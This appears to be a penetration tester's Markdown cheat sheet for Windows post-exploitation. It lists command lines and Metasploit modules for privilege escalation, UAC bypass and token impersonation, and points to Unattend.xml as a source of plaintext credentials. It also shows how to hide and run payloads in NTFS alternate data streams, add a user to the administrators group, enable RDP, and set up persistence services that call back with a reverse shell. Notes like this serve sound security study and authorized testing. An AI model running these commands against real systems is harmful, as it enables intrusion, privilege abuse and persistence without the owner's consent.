
# Cmd ping sweep (host discovery)

```
for /L %i in (1,1,255) do @ping -n 1 -w 200 10.86.174.%i > nul && echo 10.86.74.%i is up.
```

# Privesc

## Tools
[windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) #Windows_priv_esc
[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) #Windows_priv_esc
[Metasploit local priv modules](Metasploit)  #Windows_priv_esc
[MimiKatz](Mimikatz.md) #password_dump
 
## By passing UAC

- In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the windows target system


[UACME](https://github.com/hfiref0x/UACME) 

- UACme tool allows attackers to execute malicious payloads on Windows target with administrative/elevated privs by abusing the inbuilt Windows AuteElevate tool


## Token Impersonation

[Token Impersonation](Token_Impersonation.md)   

[Sweet potato](https://github.com/CCob/SweetPotato)


## Unattended Windows Setup 

Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems 
It's Typically done by **Unattended Windows Setup** which is used to automate the mass installation/deployment of Windows on systems
This tool utilizes configuration files that contain specific configurations and user account credentials, specially the Administrator account's password


- The Unattended Windows Setup utility will typically save files inside:
```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Autounattend.xml
```

## Powersploit 

[Powersploit](https://github.com/PowerShellMafia/PowerSploit)
Invoke-AllChecks

## Pass the hash

#passhash 

# Evasion 
## ADS (Alternate Data Streams)
**Data stream**: The content of the file eg. what's inside a text file is the data stream
**Metadata**: Information about the file eg. when file was created and by who etc.

- Alternate Data Streams (ADS) is an NTFS (New technology File System) file attribute and was designed to provide compatibility with the MacOS HFS (Hierarchical File System).
- Any file created on an NTFS formatted drive will have twi different forks/streams:
	- Data stream - Default stream that contains the data of the file
	- Resource stream - Typically contains metadata of the file
- Attackers can use ADS to hide malicious code or executables in legitimate files to evade detection 
- This can be done by storing malicious code or executables inside metadata of legitimate file

### Example

```powershell

notepad file.txt:hiddenfile # Creats a txt file and inside of a second file 

type PAYLOAD.exe > normalfile.txt:PAYLOAD.exe # hiding .exe file inside txt file

start normalfile.txt:PAYLOAD.exe # executing file inside normalfile.txt
OR
# Create link to the hidden file
mklink wupdate.exe PATH_OF_THE_FILE:PAYLOAD.exe
wupdate.exe # Will start PAYLOAD.exe

```

# System useful commands
## Powershell
```powershell

whoami /all
whoami /priv#  to check my user priv 
icacls check priv for files
- [enviroment]::Is64Bit [ARGUMENT] 

OperatingSystem # to check if the OS running 64bit
Process # to check if the processes running 64 bit
schtasks#  check running tasks cmd 

systeminfo

New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose # create user inside of a domain

```


## Check file perm

```
Get-ACL <file> | Fl * 
```


## Check Link files

```
powershell -c "$WScript = New-Object -ComObject WScript.Shell; $SC = Get-ChildItem *.lnk; $WScript.CreateShortcut($sc)"
```


## CMD


```powershell

whoami /priv # user privs
net user # info about user
net localgroup  # check my user groups
net localgroup administrators # or anygroup check for users in group
net user USER PASSWORD # changet user USER password to PASSWORD
net user htb abc123! /add # add the user htb with the password abc123!
net localgroup administrators htb /add # add user htb to administrators group



#services
sc stop SERVICE

sc query SERVICE to check service

sc start SERVICE to start 


# enable rdp

powershell -command "Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' "

```

### Credentials user impersonation

If you have **valid credentials of any other user**, you can **create** a **new logon session** with those credentials :

```
runas /user:domain\username cmd.exe
```












# Metasploit

## PRIV ESC 
```rb

# Exploit Suggester 
https://github.com/AonCyberLabs/Windows-Exploit-Suggester


# On the target

systeminfo
# Copy output into a file on attacker machine

./windows-exploit-suggester.py --update # Download database 

./windows-exploit-suggester.py --database DATABASEFILE.xls --systeminfo SYSTEMINFOFILE.txt

```

## Post Exploitation
```ruby

use post/windows/gather/win_privs # check user privs 
OR 
getprivs # on Meterpreter

use post/windows/gather/enum_logged_on_users # check logged in users history

use post/windows/gather/checkvm # check vm

use post/windows/gather/enum_applications # enum apps on target
use post/windows/gather/enum_av_excluded # enum for paths excluded by av
use post/windows/gather/enum_computers # enum connected computers in same LAN
use post/windows/gather/enum_shares # enum shares 

# UAC bypass

use exploit/windows/local/bypassuac_injection

```

# Maintain access 

[MimiKatz](Mimikatz.md) 



## Metasploit
- Metasploit uploads a exe payload and add the exactable to the system services and when the system gets booted if we have only listener on we will get a reverse shell and maintain access on the target  or enabling RDP etc.
```rb

use exploit/windows/local/persistence_service # adding payload to the system services to be executed when system reboots

# Meterpreter

run getgui -e -u ignite -p 123 # Enable RDP and add user of the name ignite and password 123
run getui -e # just enabble RDP

# On metasploit
use  post/windows/manage/enable_rdp  # enable RDP on target

set username pavan

set password 123

set session 1


run persistence -X

```